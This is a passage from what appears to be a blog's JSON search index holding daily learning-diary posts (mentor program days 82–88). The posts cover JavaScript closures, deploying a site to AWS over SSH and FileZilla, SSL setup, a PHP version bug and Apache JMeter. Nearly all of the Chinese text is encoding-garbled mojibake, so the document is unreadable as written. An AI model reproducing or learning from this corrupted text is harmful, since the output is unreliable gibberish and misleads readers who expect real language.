å¦å¤–ä¹Ÿç¸½ç®—å°ã€Œç‰©ä»¶å°å‘ã€é€™ç©æ„å…’æœ‰ä¸€é»æ¦‚å¿µäº†ï¼ŒåŸä¾†æ²’æœ‰æˆ‘ä»¥å‰æƒ³çš„é‚£éº¼è¤‡é›œã€‚ é¡Œå¤–è©±å…«æ–¹é›²é›†ç”°åœ’é›è‚‰æ°´é¤ƒå¥½åƒï¼ è¨±é¡˜æ± ä¸çŸ¥é“æ˜å¤©èƒ½ä¸èƒ½æå®š AWS çš„å•é¡Œï¼Œæ²’è§£æ±ºçš„è©±å°±æœƒç¹¼çºŒçœ‹ [FE201]ï¼Œç¸½ä¹‹çœ‹æƒ…æ³å§ï½","link":"/2022/03/06/mentor-program-day82/"},{"title":"mentor-program-day83","text":"ä¸€æ­¥ä¸€æ­¥ä¾†ã€‚ é€²åº¦ä»Šå¤©ä¾ç„¶æ²’æœ‰å¾—åˆ° AWS çš„å›è¦†ï¼Œæ‰€ä»¥æˆ‘ç¹¼çºŒçœ‹ [FE201] çš„å…§å®¹ï¼š é—œæ–¼ NaN é€™å€‹æ±è¥¿ é—œæ–¼ typeof å’Œè³‡æ–™å‹æ…‹ æª¢æŸ¥ä¸€å€‹è®Šæ•¸å­˜ä¸å­˜åœ¨çš„æ­£ç¢ºæ–¹å¼ æœ€å®¹æ˜“æéŒ¯çš„ Scope å¾ ECMAScript ä¾†ç†è§£é–‰åŒ…èˆ‡ä½œç”¨åŸŸçš„åŸç† é–‰åŒ…çš„æ‡‰ç”¨ï¼cache æ©Ÿåˆ¶ å¦‚æœæ˜å¤©é‚„æ˜¯ AWS é‚„æ˜¯ä¸é³¥æˆ‘ï¼Œæˆ‘å°±è¦é‡ç“£ä¸€å€‹æ–°å¸³è™Ÿäº†ã€‚ å­¸åˆ°çš„äº‹æƒ…å¾ˆé«˜èˆˆè‡ªå·±ç¸½ç®—æ˜¯æŠŠ Scope å’Œ Clousre çš„åŸç†çµ¦å¼„æ¸…æ¥šäº†ï¼Œä¹Ÿé€æ¼¸èƒ½å¤ ç†è§£ç‚ºä»€éº¼ Huli é‚£éº¼å–œæ­¡ç¿» ECMAScript ä¾†çœ‹ï¼Œç•¢ç«Ÿé‚£ç¢ºå¯¦å°±åƒæ˜¯ JavaScript ç•Œçš„è–ç¶“ä¸€æ¨£ï¼Œä½ å¯ä»¥æŠŠè£¡é¢èªªçš„æ±è¥¿éƒ½ç•¶æˆæ˜¯ã€ŒçœŸç†ã€ã€‚åªè¦ç…§è‘—è¦æ ¼èµ°ï¼Œä½ çš„æ±è¥¿çµ•å°ä¸æœƒæœ‰éŒ¯ã€‚ä¹‹å¾Œæœ‰æ™‚é–“çš„è©±ä¹Ÿè¨±æˆ‘ä¹Ÿæœƒæƒ³å»ç¿»ç¿»çœ‹ï¼Œçœ‹è£¡é¢åˆ°åº•é‚„å¯«äº†äº›ä»€éº¼ã€‚ å„˜ç®¡å…‰ç†è§£é€™äº›æ±è¥¿å°±èŠ±äº†å¿«ä¸€æ•´å¤©çš„æ™‚é–“ï¼Œä½†é‚„æ˜¯æŒºå€¼å¾—çš„ã€‚ä¸€æ­¥ä¸€æ­¥ä¾†ï¼Œæ…¢æ…¢ç´¯ç©ï¼Œç¹¼çºŒåŠ æ²¹ã€‚ é¡Œå¤–è©±æ¸›è‚¥çš„é€Ÿåº¦æ°¸é è·Ÿä¸ä¸Šå¢èƒ–çš„é€Ÿåº¦ï¼Œå”‰ï½ è¨±é¡˜æ± å¸Œæœ›æ˜å¤©èƒ½æŠŠ AWS æå®šï¼Œç¸½ä¹‹ä¸€æ¨£è¦æœ‰ç”¢å‡ºï¼Œä¸è¦æµªè²»ä¸€å¤©ã€‚","link":"/2022/03/07/mentor-program-day83/"},{"title":"mentor-program-day84","text":"ä¸€åˆ‡é †åˆ©çœŸå¥½ã€‚ é€²åº¦AWS æœç„¶é‚„æ˜¯æ²’é³¥æˆ‘ï¼Œæ‰€ä»¥ä»Šå¤©æ±ºå®šé‡ç“£æ–°å¸³è™Ÿä¾†å¼„éƒ¨ç½²ã€‚ å¤§æ¦‚èŠ±äº†ä¸€æ•´å¤©çš„æ™‚é–“æŠŠéƒ¨ç½²å®Œæˆï¼Œä¾†ç§€å€‹æˆæœï¼š ç•™è¨€æ¿ Twitch æ„Ÿè¦ºè‡ªå·±è »å¹¸é‹çš„ï¼Œæ²’æœ‰ç¢°åˆ°ä»€éº¼å¡é—œçš„æƒ…å½¢ã€‚ä¸éé‚„è »å¥½å¥‡å…¶ä»–äººéƒ½å¡åœ¨ä»€éº¼åœ°æ–¹ï¼Œæ˜å¤©æ‡‰è©²æœƒå»ç ”ç©¶çœ‹çœ‹ã€‚ é›–ç„¶ç¶²ç«™éƒ¨ç½²å®Œäº†ï¼Œä½†è©²åšçš„ç­†è¨˜å°‘ä¸äº†ï¼Œé‚„æœ‰ä¸€äº›å…¶ä»–ç´°ç¯€ä¹Ÿéƒ½å¾—åœ¨èª¿æ•´ï¼Œç¸½ä¹‹ç¹¼çºŒåŠ æ²¹ï¼ å­¸åˆ°çš„äº‹æƒ…åœ¨éƒ¨ç½²æ™‚å­¸åˆ°çš„è¨Šæ¯é‡é‚„è »å¤§çš„ï¼Œåƒæ˜¯å®Œå…¨æ²’æ‘¸éçš„ Linux ä½œæ¥­ç³»çµ±å’ŒæŒ‡ä»¤ï¼Œè·Ÿéå°ç¨±å¼åŠ å¯†å’Œ SSH ç›¸é—œçš„æ±è¥¿ï¼Œè·Ÿæ“ä½œé ç«¯çš„ä¸»æ©Ÿç­‰ç­‰ï¼Œé€™äº›æ±è¥¿ä¹Ÿè¨±å¾—èŠ±ä¸€äº›æ™‚é–“ä¾†æ¶ˆåŒ–å’Œç­†è¨˜ã€‚ ä¹Ÿå› ç‚ºé€™æ¬¡çš„éƒ¨ç½²ï¼Œç†è§£ FTP å¯¦éš›ä¸Šåˆ°åº•åœ¨å¹¹å˜›ç”¨çš„ï¼ˆä»¥å‰å¾…çš„å…¬å¸æœ‰ç”¨ï¼‰ã€‚ é¦–å…ˆè¦æ€è€ƒé€™å€‹å•é¡Œï¼š ç•¶ä½ æœ‰ä¸€å°ä¸»æ©Ÿï¼Œå®ƒä¸åœ¨ä½ å®¶ï¼Œè€Œæ˜¯åœ¨å¾ˆé çš„æŸå€‹åœ°æ–¹ï¼Œå¯æ˜¯ä½ æƒ³æŠŠé›»è…¦è£¡çš„è³‡æ–™å‚³çµ¦å®ƒè¦æ€éº¼è¾¦ï¼Ÿ ç¬¬ä¸€ç¨®ä½œæ³•æ˜¯é€é CLIï¼š å…ˆç”¨ SSH é€£åˆ°é‚£å°è™›æ“¬ä¸»æ©Ÿï¼Œé€™æ¨£ä½ å°±å¯ä»¥æ“æ§å®ƒäº† æ¥è‘—å›åˆ°æœ¬åœ°ç«¯ï¼ŒæŠŠä½ æƒ³è¦çš„æª”æ¡ˆä¸Šå‚³åˆ°æŸå€‹å¯ä»¥å­˜æª”æ¡ˆçš„å¹³å°ï¼ˆä¾‹å¦‚ï¼šGithubï¼‰ æ¥è‘—å†å›åˆ°è™›æ“¬ä¸»æ©Ÿï¼Œç”¨ git clone çš„æ–¹å¼æŠŠæª”æ¡ˆæŠ“ä¸‹ä¾† ç¬¬äºŒç¨®åšæ³•æ˜¯ç”¨ FileZillaï¼š ç”¨ FileZilla æä¾›çš„ä»‹é¢è·Ÿè™›æ“¬ä¸»æ©Ÿé€£ç·šï¼ˆæˆ‘æƒ³åº•å±¤æ‡‰è©²ä¸€æ¨£æ˜¯é€é SSHï¼‰ æˆåŠŸé€£ç·šå¾Œï¼Œæ¥ä¸‹ä¾†å°±å¾ˆç›´è¦ºäº†ï¼Œå› ç‚ºæ˜¯åœ–å½¢åŒ–ä»‹é¢ï¼Œä½ ç…§è‘—ç•«é¢æ‘¸å°±èƒ½å¤§æ¦‚æ‘¸å‡ºå€‹æ‰€ä»¥ç„¶ é€™è£¡åœ¨ç¤ºç¯„æ€éº¼æŠŠè™›æ“¬ä¸»æ©Ÿçš„ index.php æŠ“åˆ°æˆ‘çš„é›»è…¦è£¡ã€‚ è‡³æ–¼ç‚ºä»€éº¼è¦ç”¨ FileZillaï¼Ÿæˆ‘è¦ºå¾—ç†ç”±å¾ˆç°¡å–®ï¼Œå› ç‚ºæ¯”è¼ƒæ–¹ä¾¿ï¼Œåªæ˜¯é€™æ¨£å­ã€‚ å¯ä»¥æ€è€ƒçœ‹çœ‹ç”¨ CLI æœ‰ä»€éº¼å•é¡Œï¼Ÿ æ¯ç•¶è¦ä¸Šå‚³ä¸€å€‹æ–°çš„å°ˆæ¡ˆå°±å¾—é‡æ–°é–‹ä¸€å€‹ Repository éç¨‹ä¸­å¾—åè¦†æ“ä½œ Git çš„æŒ‡ä»¤ åªæ˜¯æƒ³ä¿®æ”¹å€‹å°åœ°æ–¹å°±å¾—åœ¨æœ¬åœ°é‡æ–° commitï¼Œç„¶å¾Œå†è®“è™›æ“¬ä¸»æ©Ÿ pull ä¸‹ä¾† ä½†ç”¨ FileZilla å°±ä¸ç”¨æ“”å¿ƒé€™äº›äº†ï¼Œå¯ä»¥æŠŠå®ƒç•¶æˆæ˜¯ä¸€ç¨® Google Cloud çš„æ„Ÿè¦ºï¼ŒçœŸçš„æ–¹ä¾¿è¨±å¤šã€‚ é¡Œå¤–è©±æœ€è¿‘æœƒé–‹å§‹çœ‹ä¸€ä¸‹åˆ¥äººçš„å±¥æ­·æ€éº¼å¯«ï¼Œæ„Ÿè¦ºä¸€ä»½å±¥æ­·è¦åŒæ™‚æŒæ¡ã€Œä½ åˆ°åº•æœƒä»€éº¼æŠ€è¡“ã€å’Œã€Œä¸è¦ç´°ç¯€å¤šåˆ°è®“äººè¦ºå¾—ä½ åœ¨ç¡¬æ¹Šã€æ˜¯æ¯”è¼ƒå›°é›£çš„äº‹æƒ…ã€‚ æœ‰äº›å±¥æ­·é›–ç„¶å¯¦åœ¨å¯«å¾—éå¸¸è©³ç´°ï¼Œä½†å»æœƒè®“äººæ„Ÿè¦ºå¤ªç¡¬è¦ã€‚ç”šè‡³é‚„çœ‹åˆ°æœ‰äººç‰¹åœ°å¯«äº†ä¸€ä»½ PPT ä¾†æè¿°è‡ªå·±åšçš„æŸä»½å°ˆæ¡ˆ Before å’Œ Afrer çš„å·®åˆ¥ã€‚ å¤ªè©³ç´°çœŸçš„æ˜¯å¥½çš„å—ï¼Ÿæœ‰æ™‚å€™æœƒå¥½å¥‡çœ‹å±¥æ­·çš„äººæ˜¯å¦åœ¨æ„é€™äº›å¾ˆç´°çš„æ±è¥¿ï¼Ÿ ç¸½ä¹‹å¯«å±¥æ­·çœŸçš„æ˜¯é–€å­¸å•ï¼Œå¸Œæœ›ä¹‹å¾Œè‡ªå·±èƒ½æŠŠå±¥æ­·çš„éƒ¨åˆ†åšå¥½ã€‚ è¨±é¡˜æ± æ˜å¤©æ‡‰è©²æœƒç¹¼çºŒæŠŠéƒ¨ç½²æ²’å®Œæˆçš„åœ°æ–¹çµ¦åšå®Œï¼Œç„¶å¾Œæ¶ˆåŒ–ä¸€ä¸‹ä»Šå¤©å­¸åˆ°çš„æ±è¥¿ã€‚","link":"/2022/03/08/mentor-program-day84/"},{"title":"mentor-program-day85","text":"æ¶ˆåŒ–æ—¥ã€‚ é€²åº¦ä»Šå¤©å»¶çºŒæ˜¨å¤©çš„éƒ¨ç½²ï¼Œæ–°å¢äº†ã€Œå­ç¶²åŸŸã€çš„ç¶²å€ï¼š ç•™è¨€æ¿ï¼šhttp://message-board.peanu.tw/ éƒ¨è½æ ¼ï¼šhttp://blog.peanu.tw/ æ„Ÿè¦ºæ›´æœ‰æ¨¡æœ‰æ¨£äº†ä¸€äº›ã€‚é›–ç„¶å¯ä»¥çš„è©±æ‡‰è©²è¦åœ¨ç”¨å€‹ SSL æœƒæ›´å¥½ï¼Œä¸éç›®å‰æ²’è³‡é‡‘ï¼Œå°±å…ˆåˆ°æ­¤æ‰“ä½å§ã€‚ æ¥ä¸‹ä¾†å°±æ˜¯åšç­†è¨˜æ™‚é–“å›‰ï¼š ä¸€åˆ€æœªå‰ªçš„ AWS éƒ¨ç½²ç´€éŒ„ æ€éº¼è¨­å®šå­ç¶²åŸŸï¼Ÿ ç¶²åŸŸä¸­ A å’Œ CNAME çš„å·®åˆ¥ PHP å¦‚ä½•æœ€æ–°ä¸€ç­†çš„è³‡æ–™ idï¼Ÿ MySQL åŒ¯å‡ºè³‡æ–™åº«çš„æ–¹å¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©é«”æœƒæœ€æ·±çš„æ˜¯ã€Œç‰ˆæœ¬å·®ç•°ã€çš„å½±éŸ¿ã€‚ åœ¨æŠŠéƒ¨è½æ ¼æ”¾åˆ°è™›æ“¬ä¸»æ©Ÿæ™‚ï¼Œç¶²é é¦¬ä¸Šå°±çˆ†äº†ã€‚åŸä»¥ç‚ºæ˜¯è³‡æ–™åº«é€£ç·šçš„å•é¡Œï¼Œä½†ç ”ç©¶å¾Œæ‰ç™¼ç¾ï¼š åŸä¾†æ˜¯ç”¨äº†å¤ªæ–°ç‰ˆæœ¬çš„ PHP å…§å»ºå‡½å¼ ç°¡å–®ä¾†èªªï¼Œæˆ‘å¯«ã€Œå°è¦½åˆ—ã€çš„æ™‚å€™å¯«äº†ä¸€äº› PHP ä¾†åˆ¤å®šã€Œç›®å‰é é¢ã€ä½ç½®ï¼Œä¸¦åŠ ä¸Šå°æ‡‰çš„ Class åç¨±ã€‚å¯å•é¡Œå‡ºåœ¨æˆ‘ç”¨äº† str_contains é€™å€‹å‡½å¼ï¼Œé€™æ˜¯ PHP 8 æ‰æ¨å‡ºçš„æ±è¥¿ï¼Œè€Œ Ubuntu ä¸Šçš„ PHP æ˜¯ 7.4ï¼š æ‰€ä»¥ç‚ºäº†é€™å€‹å•é¡Œåˆå¾—é‡è³¼ä¸€æ¬¡ç¨‹å¼ç¢¼ã€‚ä¸éå¾ˆå·§çš„æ˜¯å‰›å¥½å‰å¹¾å¤©æ‰å­¸åˆ°æ€éº¼è™•ç†é€™å€‹å•é¡Œï¼Œåƒè€ƒé€™ç¯‡ï¼šCSS åˆ©ç”¨ Signature ä¾†è®“å°è¦½åˆ—æ›´å¥½å¯«ã€‚ é‡æ§‹ä¹‹å¾Œå°±èƒ½æ­£å¸¸é‹ä½œäº†ï¼Œå¯å–œå¯è³€ï¼Œå¯å–œå¯è³€ã€‚ æœ€å¾Œæƒ³èªªçš„æ˜¯ å­¸æœƒæ€éº¼ debug ä¹Ÿæ˜¯å¾ˆé‡è¦çš„äº‹æƒ…ï¼Œå°¤å…¶æ˜¯ç¢°åˆ°åƒé€™ç¨®åœ¨ Local ç«¯æ­£å¸¸ï¼Œä½† Server ç«¯å»æœ‰å•é¡Œæ™‚æœƒæ›´åŠ æœ‰æ„Ÿã€‚ é¡Œå¤–è©±é€æ¼¸é‚å…¥èª²ç¨‹çš„å°¾è²äº†ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†ä¹Ÿèƒ½ä¸€åˆ‡é †åˆ©ã€‚ è¨±é¡˜æ± æ˜å¤©æœƒæŠŠå…¶ä»–ä½œæ¥­åšå®Œï¼Œä¹Ÿæœƒç ”ç©¶ä¸€ä¸‹è£œå……æ•™æçš„éƒ¨åˆ†ã€‚","link":"/2022/03/09/mentor-program-day85/"},{"title":"mentor-program-day86","text":"ä¸èƒ½åœä¸‹è…³æ­¥ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒç ”ç©¶å’Œéƒ¨ç½²ç›¸é—œçš„æ±è¥¿ï¼ˆæ·±æ·±é«”æœƒåˆ°ä»€éº¼å«ç„¡åº•æ´ï¼Œèƒ½æ¶‰å…¥çš„æ±è¥¿å¤ªå¤šäº†ï¼‰ï¼ŒæŠŠéƒ¨å±¬çš„ç¶²ç«™åŠ ä¸Šäº† SSLï¼Œä¹Ÿçœ‹äº†ä¸€äº›åŒå­¸çš„ç´€éŒ„ã€‚ä¸å¾—ä¸ä½©æœæŸä½åŒå­¸å¯«çš„å¿ƒå¾—ï¼šåœ¨ AWS ä¸Šé¢éƒ¨ç½² LEMP server, PHPmyadmin, FTP ï¼Œçœ‹å®Œå¾Œæ‰ç™¼ç¾è‡ªå·²é‚„æœ‰å¾ˆå¤šç´°ç¯€éƒ¨åˆ†æ²’å»è¨­å®šã€‚ä¸éå¯¦åœ¨æ‡¶äº†ï¼Œæš«æ™‚å…ˆé€™æ¨£å§ï¼Œç•¢ç«Ÿä¸æ˜¯çœŸçš„å½±éŸ¿éå¸¸å¤§çš„æ±è¥¿ï¼š æ‡‚çš„è¨­å®šåœæé»ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ - Huli æ¥ä¸‹ä¾†ï¼Œç‚ºäº†ç ”ç©¶ é€™ä»½ä½œæ¥­ åˆ°åº•æ€éº¼å¯«ï¼Œä¹Ÿæ˜¯å»æŠŠ [MTR01] æŒ–å‡ºä¾†çœ‹ï¼Œä»¥åŠçœ‹åŒå­¸çš„ä½œæ¥­ã€‚ç›®å‰ç®—æ˜¯ç¨å¾®æ‘¸å‡ºä¸€é»é ­ç·’äº†ï¼Œæ˜å¤©å¤§æ¦‚å°±èƒ½è©¦è‘—åšå‡ºä¾†å§ã€‚ æœ€å¾Œé™„ä¸Šä¸€ä¸‹ä»Šå¤©çš„ç­†è¨˜ï¼š ä»€éº¼æ˜¯ä¼ºæœå™¨ï¼Ÿ çŸ¥é“å¯¦é«” IP çš„è©±å¯ä»¥çŸ¥é“æˆ‘çš„ä½ç½®å—ï¼Ÿ SSH ç”¨åˆ¥åçš„æ–¹å¼ä¾†é€£ç·š ä¼ºæœå™¨æ¶æ§‹ è¨­å®š SSL æ†‘è­‰ è³‡æ–™åº«ä¸­çš„ Viewã€Stored Procedure å’Œ Triggers å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©é‡æ–°è¤‡ç¿’äº†å¾Œç«¯çš„ä¼ºæœå™¨æ¶æ§‹ï¼Œä¹Ÿé«”æœƒåˆ°äººå®¶å¸¸èªªã€Œå¾Œç«¯çš„ä¸–ç•Œå¾ˆå»£ã€åˆ°åº•æ˜¯åœ¨ã€Œå»£ä»€éº¼ï¼Ÿã€ å»£åˆ°ä½ è…¦è¢‹çˆ†ç‚¸çš„é‚£ç¨®ã€‚ ä¸éæœ‰äº›éƒ¨åˆ†é‚„æ˜¯è »æœ‰è¶£çš„ï¼Œåƒæ˜¯ load balance å’Œ replication çš„æ¶æ§‹å°±è »äººæ€§çš„ï¼Œç›¸ä¿¡åœ¨æ²’æœ‰é€™äº›æ¶æ§‹ä¹‹å‰å¯èƒ½å¸¸å¸¸æœƒæœ‰é€™äº›æƒ…å¢ƒï¼š ã€Œé é‚€ï¼Œæ²’æƒ³åˆ°è·³æ¨“å¤§æ‹è³£æœƒå¸å¼•é€™éº¼å¤šäººï¼Œä¼ºæœå™¨æ’ä¸ä½å•¦ã€‚ã€ ã€ŒæŒ«è³½ï¼Œè³‡æ–™åº« GG äº†æ€éº¼è¾¦ï¼Œå®Œå…¨æ²’æœ‰å‚™ä»½é˜¿ã€‚ã€ ç¸½ä¹‹ï¼Œé›–ç„¶é€™äº›æ¶æ§‹çœ‹ä¼¼å¾ˆè¤‡é›œï¼Œä¸éä¹Ÿè¨±å°±æ˜¯å› ç‚ºè¸©éäº†å¾ˆå¤šã€Œé›·ã€ï¼Œæ‰é«”æœƒåˆ°ä»€éº¼æ˜¯æ›´å¥½çš„åšæ³•ã€‚ é¡Œå¤–è©±æ„Ÿè¦ºé€™å¹¾å¤©é€²åº¦ä¸å¤ ï¼Œä½†åˆæœ‰é»æä¸èµ·å‹ã€‚ æœ‰æ™‚å€™æœƒæƒ³ä»€éº¼äº‹æƒ…éƒ½ä¸åšï¼Œååœ¨ä¸€å€‹é™°æ¶¼çš„åœ°æ–¹å¹å¹é¢¨ï¼Œçœ‹çœ‹é¢¨æ™¯ã€‚ä¸çŸ¥é“è‡ªå·±æ˜¯ä¸æ˜¯çœŸçš„è€äº†ï½ è¨±é¡˜æ± æ˜å¤©å¸Œæœ›èƒ½æŠŠæ¶æ§‹åœ–ç•«å®Œï¼Œæ¥è‘—æŠŠ week14 çµ¦å®Œæˆã€‚","link":"/2022/03/10/mentor-program-day86/"},{"title":"mentor-program-day87","text":"æ¯å¤©éƒ½æ›´å¾€å‰ä¸€æ­¥ï¼Œå¾ˆå¥½ã€‚ é€²åº¦ä»Šå¤©çµ‚æ–¼æŠŠæ¶æ§‹åœ–ç•«å‡ºä¾†äº†ï¼š é›–ç„¶çœ‹èµ·ä¾†å¾ˆ Lowï¼Œä¹Ÿå¿½ç•¥äº†å¾ˆå¤šç´°ç¯€éƒ¨åˆ†ï¼Œä¸éç•«å®Œå¾Œæœ‰æ›´åŠ ç†è§£é€™æ•´å€‹æµç¨‹ï¼Œæ‡‰è©²é‚„æ˜¯è »æœ‰å¹«åŠ©çš„ã€‚ æ¥ä¸‹ä¾†å°±ç¹¼çºŒå¯«å‰©ä¸‹çš„ä½œæ¥­ï¼Œå¯«åˆ° lock çš„éƒ¨åˆ†æ™‚ç™¼è¦ºè‡ªå·±å¥½åƒæ²’æœ‰å¾ˆæ¸…æ¥šï¼Œè§£é‡‹çš„ä¸å¤ æ¸…æ¥šã€‚æ‰€ä»¥åˆæŠŠ [MTR01] æŒ–å‡ºä¾†è¤‡ç¿’ï¼ŒæŠŠä»¥å‰åšçš„ç­†è¨˜åšå¾—æ›´å®Œæ•´ä¸€äº›ï¼šè³‡æ–™åº«ä¸­çš„ Transaction èˆ‡ Lockã€‚ æ˜å¤©æ‡‰è©²å°±çœŸçš„èƒ½å®Œæˆä½œæ¥­äº†ï¼ŒåŠ æ²¹åŠ æ²¹ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨å­¸ä¸€å€‹çŸ¥è­˜æ™‚ï¼Œå¦‚æœå¯ä»¥ã€Œè‡ªå·±åšéä¸€éã€ï¼ŒçœŸçš„å°å­¸ç¿’çš„æ•ˆæœç¢ºå¯¦æœƒæ¯”è¼ƒå¥½ã€‚ ä»Šå¤©å¯¦ä½œäº† lock æ©Ÿåˆ¶å¾Œï¼Œæ‰æ›´åŠ ç†è§£é€™æ±è¥¿è¦æ€éº¼ç”¨ï¼Œé‚„æœ‰å®ƒçš„é©ç”¨å ´æ™¯ã€‚å¦å¤–ä¹Ÿå› ç·£éš›æœƒä¸‹æ‘¸åˆ°äº†ä¸€å€‹æ–°å·¥å…·ï¼šApache JMeterã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯å€‹ç”¨ä¾†æ¸¬è©¦ server çš„å·¥å…·ï¼Œä¸éæœ‰è¶£çš„æ˜¯æˆ‘åœ¨å®‰è£é€™å€‹å·¥å…·æ™‚ç¢°äº†ä¸€äº›å° bugï¼Œè€Œ bug çš„è§£æ³•ä¹Ÿæ„å¤–åœ°é åŒ—ï¼š å®‰è£éŒ¯ç‰ˆæœ¬ å®˜ç¶²çš„ ä¸‹è¼‰é é¢ æœ‰æä¾›å…©ç¨®ç‰ˆæœ¬ï¼Œä¸€ç¨®æ˜¯ã€ŒBinariesã€ï¼Œä¸€ç¨®æ˜¯ã€ŒSourceã€ï¼Œç„¶å¾Œæˆ‘ä¸€é–‹å§‹è¼‰çš„æ˜¯ Sourceï¼Œæƒ³èªª Binaries çœ‹èµ·ä¾†ä¸å¤ªåƒæ˜¯å¯ä»¥è·‘çš„æ±è¥¿ã€‚ çµæœæŠŠ JDKï¼ˆJava Development Kitï¼‰è£å¥½å¾Œå»é‚„æ˜¯ä¸€ç›´é–‹ä¸èµ·ä¾†ï¼Œç„¡å¥ˆä¹‹ä¸‹åªå¥½çˆ¬æ–‡ï¼Œç™¼ç¾é€™ä¸€ç¯‡ï¼šHow to resolve the error â€œUnable to access jarfile ApacheJMeter.jar errorlevel=1â€ while initiating Jmeter? è£¡é¢æœ‰äººæåˆ°ï¼š By mistake most people gets source of jmeter downloaded instead of binary . Because of that they donâ€™t find ApacheJmeter.jar file under bin folder . So download binary not the source ç°¡å–®ä¾†èªªå°±æ˜¯å¤§å®¶éƒ½ä¸‹è¼‰æˆ source å•¦ï¼Œæ‰€ä»¥é›£æ€ªé–‹ä¸èµ·ä¾†ï¼Œçœ‹ä¾†ä¸æ˜¯åªæœ‰æˆ‘ä¸€å€‹äºº XD å¥‡å¦™çš„ä¸»é¡Œæ¨£å¼ é€™å€‹ bug ä¹Ÿæ˜¯å¤ ç¥å¥‡ï¼Œå¦‚æœä½¿ç”¨ã€Œdarkã€ç³»åˆ—çš„ä¸»é¡Œï¼ˆé åŒ—çš„æ˜¯é è¨­å°±æ˜¯ darkï¼‰ï¼Œé‚£å°±æœƒæ²’è¾¦æ³•å­˜æª”ã€‚ è©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šWhy i cannot save the test plan in jmeter? ç¬¬ä¸€æ¬¡è¦‹éé€™ç¨® bugï¼Œå¤ªç¥å•¦ã€‚ é¡Œå¤–è©±çœ‹åˆ°ç¾éº—çš„é¢¨æ™¯æœƒä¸è‡ªè¦ºçš„æ”¾æ…¢é€Ÿåº¦ï¼Œäº«å—é€™æ¨£çš„å¯§éœæ™‚å…‰ã€‚ è¨±é¡˜æ± å¸Œæœ›æ˜å¤©æŠŠ week14 æ­£å¼çµæŸï¼Œç„¶å¾Œé€²åˆ°ä¸‹ä¸€é€±ã€‚","link":"/2022/03/11/mentor-program-day87/"},{"title":"mentor-program-day88","text":"ä¸èƒ½æ‰ä»¥è¼•å¿ƒã€‚ é€²åº¦ä»Šå¤©é‡æ–°è¤‡ç¿’äº†éƒ¨ç½²å­¸åˆ°çš„æ±è¥¿ï¼Œåšäº†ä¸€äº›ç­†è¨˜ï¼š Linux ä¸­çš„æŒ‡ä»¤ ç†è§£é‚£äº›äº”èŠ±å…«é–€çš„å°ˆæœ‰åè©ï¼šIaaSã€PaaS å’Œ SaaS æ€éº¼çªç„¶åˆè·‘å›å»è¤‡ç¿’ï¼Ÿå…¶å¯¦æ˜¯å› ç‚ºçœ‹åˆ°äº†é€™æ®µè©±ï¼š å…ˆä¾†è¬›ä¸€ä¸‹ä¹‹å¾Œåå››é€±çš„æ±è¥¿åå››é€±æœƒæ˜¯ç¶²ç«™éƒ¨ç½²ï¼Œä½ å¯èƒ½æœƒä¸çŸ¥é“è‡ªå·±åœ¨å¹¹å˜›å› ç‚ºæ ¹æ“šæŒ‡å®šæ•™æçš„é‚£äº›æ•™å­¸æ–‡ï¼Œä½ å¯èƒ½æŒ‡ä»¤è¤‡è£½è²¼ä¸Šå°±æå®šäº†æœ‰äº›äººçš„åšäº‹æƒ…æ˜¯ï¼šç ”ç©¶ =&gt; è¦åŠƒ =&gt; åŸ·è¡Œä½†å…¶å¯¦æœ€å¾Œå°‘äº†ä¸€æ­¥ï¼ŒåŸ·è¡ŒçµæŸä¹‹å¾Œé‚„éœ€è¦æœ‰å€‹ã€Œæª¢è¨ã€ç•¶ä½ éƒ¨ç½²å®Œæˆä¹‹å¾Œï¼Œé‡é»æ˜¯ä½ æœ‰æ²’æœ‰ææ¸…æ¥šæ¯ä¸€æ­¥å¤§æ¦‚åœ¨åšä»€éº¼ï¼Ÿæˆ‘è²¼çš„æŒ‡ä»¤æ˜¯ä»€éº¼ï¼Ÿå®ƒçš„ç›®çš„æ˜¯ä»€éº¼ï¼Ÿé‚£äº›æ–‡ç« æ²’æœ‰é™„ï¼Œé‚£å°±è‡ªå·±å»æŸ¥ã€Œå­¸æ±è¥¿æ²’æœ‰å­¸é€²å»ã€ï¼ŒæŒ‡çš„å°±æ˜¯è¤‡è£½è²¼ä¸Šä»¥å¾ŒæˆåŠŸäº†å°±ä¸ç®¡äº†é€™å°±åƒæ˜¯è€ƒè©¦ï¼Œè€ƒå®Œä»¥å¾ŒçŸ¥é“å“ªé¡Œå°å“ªé¡ŒéŒ¯ï¼Œçœ‹ä¸€çœ‹å°±éäº†ä½†æª¢è¨å‘¢ï¼Ÿæª¢è¨ä¸è¦‹äº†ï¼Œè€Œé€™å…¶å¯¦æ‰æ˜¯æœ€ç²¾è¯çš„ä¸€ç’°ç„¡è«–ä½ é¡Œç›®ç­”å°æˆ–ç­”éŒ¯ï¼Œå…¶å¯¦éƒ½é‚„å¯ä»¥å†æª¢è¨ï¼Œéƒ½å¯ä»¥å†é€²æ­¥é¸æ“‡é¡Œä½ é¸å°äº†ä¸€å€‹é …ç›®ï¼Œé‚£å¦å¤–ä¸‰å€‹éŒ¯åœ¨å“ªè£¡ï¼Ÿä½ å°±å¤šæœƒäº†ä¸‰é¡Œä¸è¦å°çœ‹äº†æª¢è¨çš„æ•ˆç›Š é›–ç„¶èªªæˆ‘ä¸¦åšæ²’æœ‰ã€Œè¤‡è£½è²¼ä¸Šã€é€™ä»¶äº‹ï¼Œä½†åœ¨ç¢°åˆ°ä¸å¤ªæ‡‚çš„æ±è¥¿æ™‚ç¢ºå¯¦æœƒæœ‰ã€Œå…ˆé€™æ¨£å§ï¼Œå‰©ä¸‹çš„ä»¥å¾Œå†ä¾†è£œã€çš„å¿ƒæ…‹ï¼ˆä½†é€šå¸¸ä¸æœƒæœ‰é‚£å€‹ä»¥å¾Œï¼‰ã€‚ 